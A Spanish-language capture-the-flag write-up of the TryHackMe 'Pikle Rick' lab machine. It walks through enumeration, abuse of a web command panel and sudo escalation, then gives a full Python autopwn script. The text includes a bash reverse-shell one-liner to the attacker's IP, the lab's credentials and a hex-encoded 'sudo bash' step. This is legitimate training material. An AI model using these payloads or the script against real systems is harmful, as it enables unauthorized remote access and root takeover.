---
title: Pikle Rick TryHackMe Write-up
categories: [Write up, TryHackMe]
date: 2023-02-09
tags: [Enumeration, Web, Information leakage, SUDO, Autopwn, Scripting, Fuzzing, Linux, Easy]
pin: false
math: true
mermaid: true
---

<img src="/imagenes/Root_me/Tryhackme.png"  width="550" height="250">


## Resumen

Saludos, en esta oportunidad vamos a resolver la máquina de **TryHackMe** llamada **Pikle Rick**, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:

*   **Enumeración del sistema.**
*   **Fuzzing de directorios web.**
*   **Abuso de la web.**
*   **Abuso de SUDO.**


Siendo sincero, no sabía si subir esta máquina pues es demasiado fácil, pero bueno, vamos a ello.

## Reconocimiento y Enumeración

En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando `ping`:

```
ping -c 1 10.10.170.234
PING 10.10.170.234 (10.10.170.234) 56(84) bytes of data.

64 bytes from 10.10.170.234: icmp_seq=1 ttl=63 time=215 ms
```
Se observa que existe una correcta conexión con la máquina.

Para realizar un reconocimiento activo se utilizará la herramienta `nmap` en búsqueda de puertos abiertos, en este caso utilizando parámetros como -sS y --min-rate para acelerar el proceso, pues estamos en un CTF:

```
sudo nmap -p- -sS --open --min-rate 5000 10.10.170.234 -oG portScan
```
Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima: 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Realizamos un escaneo de los servicios expuestos utilizando `nmap`:

```
sudo nmap -sCV -p22,80 10.10.170.234 -oN services     
```

Como resultado del escaneo tenemos:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99d38b2b1976f7b2e4206d459f98a775 (RSA)
|   256 d38c694e94bae7182f59c601e5fba011 (ECDSA)
|_  256 3da279a5437138fb95f5500cf8ef9352 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tenemos un servicio **http**, si intentamos buscar por vulnerabilidades asociadas a las versiones de los servicios utilizados en la máquina, no encontraremos nada, por lo tanto, utilizando la herramienta `whatweb` vamos a enumerar información del sitio web que nos puede ser de utilidad:

```
whatweb 10.10.170.234

http://10.10.170.234 [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.170.234], JQuery, Script, Title[Rick is sup4r cool]
```
Vamos a ingresar a la web para ver que encontramos:

![](/imagenes/PikleRick/piklerick1.png)


## Explotación

Vemos la página principal, sin embargo, no hay mucho que hacer con respecto al análisis de parte de la web, pues no podemos realizar ninguna interacción con la misma. Echemosle un ojo al código fuente por si encontramos algo especial:

![](/imagenes/PikleRick/piklerick2.png)


Vemos un nombre de usuario, **R1ckRul3s**.

Si seguimos buscando no entramos mucho, vamos a realizar fuzzing para encontrar nuevos directorios, para ello utilizaremos `gobuster`, por el hecho que es más facil fuzzear con distintas extensiones:
```
gobuster -u http://10.10.170.234 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -x php,txt
```
Como resultado tenemos:

```
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 315] [--> http://10.10.170.234/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]                    
/robots.txt           (Status: 200) [Size: 17]
```

Vemos página interesantes, vamos a ver el login:

![](/imagenes/PikleRick/piklerick3.png)

Necesitamos credenciales válidas, y no tenemos nada. Antes de realizar fuerza bruta, vamos a buscar por los otros directorios, en verdad el **portal.php**, redirige al login, por lo tanto, vamos a ver el **robots.txt**:

![](/imagenes/PikleRick/piklerick4.png)

Vemos esta palabra, vamos a asumir que es una contraseña, asi que iremos la panel de login e intentamos entrar:

![](/imagenes/PikleRick/piklerick5.png)

Hemos entrado. Podemos ver un imput para ejectuar comandos, esto no se ve nada bien, vamos a ingresar el comando **id**:

![](/imagenes/PikleRick/piklerick6.png)

Estamos ejecutando comandos en la máquina víctima. Por lo tanto, vamos a ganar acceso con el siguiente comando:

```
bash -c 'bash -i >& /dev/tcp/10.14.48.121/1234 0>&1'
```
Con el cual estamos enviandonos una consola interactiva a nuestra máquina, por lo tanto, vamos a tener `nc` escuchando las conexiones entrantes por el puerto 1234:
```
nc -nvlp 1234   
listening on [any] 1234 ...
```

Lo ejecutamos en la web:

![](/imagenes/PikleRick/piklerick7.png)


Al enviarlo, revisamos nuestro `netcat`:
```
nc -nvlp 1234   
listening on [any] 1234 ...
connect to [10.14.48.121] from (UNKNOWN) [10.10.170.234] 41450
bash: cannot set terminal process group (1344): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-170-234:/var/www/html$ whoami
whoami
www-data
www-data@ip-10-10-170-234:/var/www/html$ 
```
¡Bien!, ganamos acceso.


## Escalada de privilegios

El primer paso será arreglar la terminal, para ello vamos a ejecutar los siguiente comandos:

- script /dev/null -c bash
- control + z
- stty ray -echo; fg
- reset xterm
- export TERM=xterm
- export SHELL=bash
- stty rows X columns Y (dependiendo de tu stty size)

De esta forma obtenemos una stty más cómoda.

Si vemos los archivos del directorio:
```
www-data@ip-10-10-170-234:/var/www/html$ ls
ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```
Tenemos el primer ingrediente.
```
www-data@ip-10-10-170-234:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt 
mr. **************
```
Vamos a buscar a los directorios personales de los usuarios:
```
www-data@ip-10-10-170-234:/var/www/html$ cd /home
www-data@ip-10-10-170-234:/home$ ls
rick  ubuntu
www-data@ip-10-10-170-234:/home$ ls rick/
second ingredients
www-data@ip-10-10-170-234:/home$ cat rick/second\ ingredients 
1 ********
```
Tenemos ya el segundo ingrediente, en este punto vamos a ver nuestros privilegios:
```
www-data@ip-10-10-170-234:/home$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-170-234.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-170-234.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

Bueno, podemos ejectuar cualquier comando como root, por lo tanto, vamos a convertinos en el:
```
www-data@ip-10-10-170-234:/home$ sudo bash
root@ip-10-10-170-234:/home# whoami
root
```
Listo, nos hemos convertido en root, vamos a buscar el últimos ingrediente:
```
root@ip-10-10-170-234:/home# cat /root/3rd.txt
3rd ingredients: ******
```
Listo, hemos completado la máquina.

Como la máquina ha sido demasiado sencilla, vamos a realizar la automatización de la intrusión, esto lo haremos mediante python como siempre.


El primer paso son las librarías que utilizaremos:

```py
import requests,sys,signal
from pwn import *
```
Luego, definimos los colores, la función para salir del sistema y las variables globales:

```py
Colors = {
    'red': '\033[31m',
    'green': '\033[32m',
    'yellow': '\033[33m',
    'blue': '\033[34m',
    'purple': '\033[35m',
    'cyan': '\033[36m',
    'grey': '\033[37m',
    'reset': '\033[0m'
}

def exiting():
    print(Colors['red']+"\n[!] saliendo...\n"+Colors['reset'])
    sys.exit(1)

if len(sys.argv) < 3:
    print(Colors['yellow'] + f'\n[!] Uso: python3 {sys.argv[0]} "IP"  "Victim_IP"' + Colors['reset'] )
    exiting()

s = requests.Session()
victim = f'http://{sys.argv[2]}/login.php'
victim_portal = f'http://{sys.argv[2]}/portal.php'
```

Luego, más utilidades como el control + c y funciones para animación y sucesos completados:

```py
def controlc(sig, frame):
    print(Colors['red']+"\n\n[!] saliendo...\n"+Colors['reset'])
    sys.exit(1)

signal.signal(signal.SIGINT, controlc)

def wait():
    for i in range(3):
        print(Colors['purple'] + ".", end='')
        time.sleep(0.8)
    print(Colors['reset'] + '\n')
    return

def success():
    print(Colors['green'] + "\t¡Completado!"+ Colors['reset'])
    sleep(1)
```

Tenemos entonces, la función de inicio de sesión:

```py
def login():

    post_data= {
        'username': 'R1ckRul3s',
        'password': 'Wubbalubbadubdub',
        'sub':'Login'
    }
    print(Colors['purple']+"\nIniciando sesión en la página"+Colors['reset'],end='')
    wait()
    r = s.post(victim,data=post_data)
    success()
```

Luego, la función que realiza la conexión reversa:

```py
def shell():
    payload = f'bash -c "bash -i >& /dev/tcp/{sys.argv[1]}/1234 0>&1"'

    post_data={
        'command': payload,
        'sub' : 'Execute'
    }
    r = s.post(victim_portal,data=post_data)
```
Finalmente, el main, donde llamamos las funciones y preparemos el listener, además de realizar la escalada de privilegios:

```py
if __name__ == '__main__':
    login()
    print(Colors['purple']+"\nEstableciendo la conexión reversa"+Colors['reset'],end='')
    wait()
    try:
        threading.Thread(target=shell, args=()).start()
    except Exception as e:
        log.error(str(e))
    
    shell = listen(1234, timeout=15).wait_for_connection()

    if shell.sock is None:
        print(Colors['red'] + "\nNo se ha obtenido ninguna conexión :(" + Colors['reset'])
        sleep(1)
        exiting()
    else:
        print('\n')
        success()
        print(Colors['green'] + "\n\t[+]Conexión establecida como usuario www-data\n" + Colors['reset'])
        time.sleep(1)
    
    print(Colors['purple'] + "\nIniciando escalada de privilegios" + Colors['reset'],end='')
    wait()
    shell.sendline(b'\x73\x75\x64\x6f\x20\x62\x61\x73\x68')
    print(Colors['green'] + "\nPwned!!!\n" + Colors['reset'])
    shell.interactive()
```
Si lo ejecutamos:

```
[*] Switching to interactive mode
bash: cannot set terminal process group (1344): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-170-234:/var/www/html$ sudo bash
$ whoami
root
$  
```

El código completo es el siguiente:
```py
import requests,sys,signal
from pwn import *

Colors = {
    'red': '\033[31m',
    'green': '\033[32m',
    'yellow': '\033[33m',
    'blue': '\033[34m',
    'purple': '\033[35m',
    'cyan': '\033[36m',
    'grey': '\033[37m',
    'reset': '\033[0m'
}

def exiting():
    print(Colors['red']+"\n[!] saliendo...\n"+Colors['reset'])
    sys.exit(1)

if len(sys.argv) < 3:
    print(Colors['yellow'] + f'\n[!] Uso: python3 {sys.argv[0]} "IP"  "Victim_IP"' + Colors['reset'] )
    exiting()

s = requests.Session()
victim = f'http://{sys.argv[2]}/login.php'
victim_portal = f'http://{sys.argv[2]}/portal.php'

def controlc(sig, frame):
    print(Colors['red']+"\n\n[!] saliendo...\n"+Colors['reset'])
    sys.exit(1)

signal.signal(signal.SIGINT, controlc)

def wait():
    for i in range(3):
        print(Colors['purple'] + ".", end='')
        time.sleep(0.8)
    print(Colors['reset'] + '\n')
    return

def success():
    print(Colors['green'] + "\t¡Completado!"+ Colors['reset'])
    sleep(1)

def login():

    post_data= {
        'username': 'R1ckRul3s',
        'password': 'Wubbalubbadubdub',
        'sub':'Login'
    }
    print(Colors['purple']+"\nIniciando sesión en la página"+Colors['reset'],end='')
    wait()
    r = s.post(victim,data=post_data)
    success()

def shell():
    payload = f'bash -c "bash -i >& /dev/tcp/{sys.argv[1]}/1234 0>&1"'

    post_data={
        'command': payload,
        'sub' : 'Execute'
    }
    r = s.post(victim_portal,data=post_data)

if __name__ == '__main__':
    login()
    print(Colors['purple']+"\nEstableciendo la conexión reversa"+Colors['reset'],end='')
    wait()
    try:
        threading.Thread(target=shell, args=()).start()
    except Exception as e:
        log.error(str(e))
    
    shell = listen(1234, timeout=15).wait_for_connection()

    if shell.sock is None:
        print(Colors['red'] + "\nNo se ha obtenido ninguna conexión :(" + Colors['reset'])
        sleep(1)
        exiting()
    else:
        print('\n')
        success()
        print(Colors['green'] + "\n\t[+]Conexión establecida como usuario www-data\n" + Colors['reset'])
        time.sleep(1)
    
    print(Colors['purple'] + "\nIniciando escalada de privilegios" + Colors['reset'],end='')
    wait()
    shell.sendline(b'\x73\x75\x64\x6f\x20\x62\x61\x73\x68')
    print(Colors['green'] + "\nPwned!!!\n" + Colors['reset'])
    shell.interactive()
```

Hemos terminado la automatización de la intrusión.

Nos vemos, hasta la próxima.
